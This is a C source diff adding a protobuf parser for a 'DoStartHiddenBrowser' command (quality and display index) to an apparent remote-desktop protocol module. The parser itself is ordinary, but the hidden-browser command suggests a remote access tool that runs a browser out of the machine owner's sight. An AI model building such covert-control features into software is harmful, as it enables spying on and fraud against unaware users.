@@ -334,6 +334,47 @@ int remote_proto_decode_get_desktop(const unsigned char* body, unsigned int body
     return 1;
 }
 
+/* Parse DoStartHiddenBrowser body: field 1 Quality, field 2 DisplayIndex. Protobuf-net may wrap in field 42. */
+int remote_proto_decode_do_start_hidden_browser(const unsigned char* body, unsigned int body_len, int* quality, int* display_index) {
+    if (!body || !quality || !display_index) return 0;
+    *quality = 75;
+    *display_index = 0;
+    const unsigned char* parse_body = body;
+    unsigned int parse_len = body_len;
+    if (body_len >= 3) {
+        unsigned int tag_consumed = 0;
+        unsigned int tag_val = read_varint(body, body_len, &tag_consumed);
+        if (tag_consumed > 0 && (tag_val & 7) == 2) {
+            unsigned int len_consumed = 0;
+            unsigned int inner_len = read_varint(body + tag_consumed, body_len - tag_consumed, &len_consumed);
+            if (len_consumed > 0 && tag_consumed + len_consumed + inner_len <= body_len) {
+                parse_body = body + tag_consumed + len_consumed;
+                parse_len = inner_len;
+            }
+        }
+    }
+    unsigned int i = 0;
+    while (i + 2 <= parse_len) {
+        unsigned char tag = parse_body[i++];
+        unsigned int wire = tag & 7;
+        unsigned int field = tag >> 3;
+        if (wire == 0) {
+            unsigned int consumed = 0;
+            unsigned int v = read_varint(parse_body + i, parse_len - i, &consumed);
+            if (consumed == 0) break;
+            if (field == 1) *quality = (int)(v > 100 ? 100 : (v < 1 ? 75 : v));
+            else if (field == 2) *display_index = (int)(v < 0 ? 0 : v);
+            i += consumed;
+        } else if (wire == 2) {
+            unsigned int len_consumed = 0;
+            unsigned int len = read_varint(parse_body + i, parse_len - i, &len_consumed);
+            if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
+            i += len_consumed + len;
+        } else break;
+    }
+    return 1;
+}
+
 /* Resolution message: field 1 Width (varint), field 2 Height (varint). */
 static unsigned int put_resolution(unsigned char* out, unsigned int out_size, int width, int height) {
     unsigned int pos = 0;
